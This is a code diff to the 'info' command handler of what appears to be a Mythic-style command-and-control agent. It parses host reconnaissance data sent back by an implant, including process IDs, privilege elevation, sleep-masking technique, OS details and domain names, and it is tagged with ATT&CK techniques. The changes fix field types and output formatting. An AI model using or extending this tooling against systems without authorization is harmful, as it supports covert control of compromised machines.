@@ -12,17 +12,14 @@ class InfoArguments( TaskArguments ):
 
     async def parse_arguments(self):
         if len( self.command_line.strip() ) > 0:
-            raise Exception("pwd takes no command line arguments.")
+            raise Exception("info takes no command line arguments.")
         pass
 
 class InfoCommand( CommandBase ):
     cmd         = "info"
     needs_admin = False
-    help_cmd    = \
-    """
-    Get information from agent, configs, session and machine.
-    """
-    description = "Get several information"
+    help_cmd    = "info"
+    description = "Get session and machine information"
     version     = 1
     author      = "@Oblivion"
     attackmapping  = ["T1083", "T1106", "T1570"]
@@ -38,7 +35,6 @@ class InfoCommand( CommandBase ):
         return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
             Success=True,
-            DisplayParams=task.args.command_line,
         )
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
@@ -63,13 +59,13 @@ class InfoCommand( CommandBase ):
             ProcID  = Psr.Int32();
             TdID    = Psr.Int32();
             ParID   = Psr.Int32();
-            HHeap   = Psr.Int32();
+            HHeap   = Psr.Int64();
             SleepT  = Psr.Int32();
             ProcAch = Psr.Int32();
-            Elevate = Psr.Pad( 1 );
+            Elevate = Psr.Int16();
 
-            MaskID  = Psr.Pad( 1 );
-            MaskHp  = Psr.Pad( 1 );
+            MaskID  = Psr.Int16();
+            MaskHp  = Psr.Int16();
             JmpGdt  = Psr.Int64();
             NtCntGd = Psr.Int64();
 
@@ -80,8 +76,8 @@ class InfoCommand( CommandBase ):
             OsAc  = Psr.Int32();
             OsMj  = Psr.Int32();
             OsMn  = Psr.Int32();
-            OsBd  = Psr.Int32();
-            PTyp  = Psr.Int32();
+            OsBd  = Psr.Str();
+            PTyp  = Psr.Str();
             TotRm = Psr.Int32();
             AvlRm = Psr.Int32();
             UsdRm = Psr.Int32();
@@ -114,7 +110,7 @@ class InfoCommand( CommandBase ):
                 "Parent ID": ParID,
                 "Heap Address using": hex( HHeap ),
                 "Sleep Time": SleepT % 1000,
-                "Process Arch": ProcAch,
+                "Process Arch": "x86" if ProcAch == 0x86 else "x64" if ProcAch == 0x64 else str(ProcAch),
                 "Elevate": Elevate.hex() if isinstance(Elevate, bytes) else Elevate,
                 "Mask Technique": MaskID.hex() if isinstance(MaskID, bytes) else MaskID,
                 "Mask Heap": MaskHp.hex() if isinstance(MaskHp, bytes) else MaskHp,
@@ -124,7 +120,7 @@ class InfoCommand( CommandBase ):
                 "Computer Name": CmpN,
                 "Domain Name": DomN,
                 "Net Bios": NetB,
-                "OS Arch": OsAc,
+                "OS Arch": "x86" if OsAc == 0x86 else "x64" if OsAc == 0x64 else str(OsAc),
                 "Version": f"{OsMj}.{OsMn}.{OsBd}",
                 "Product Type": PTyp,
                 "Total RAM": TotRm,
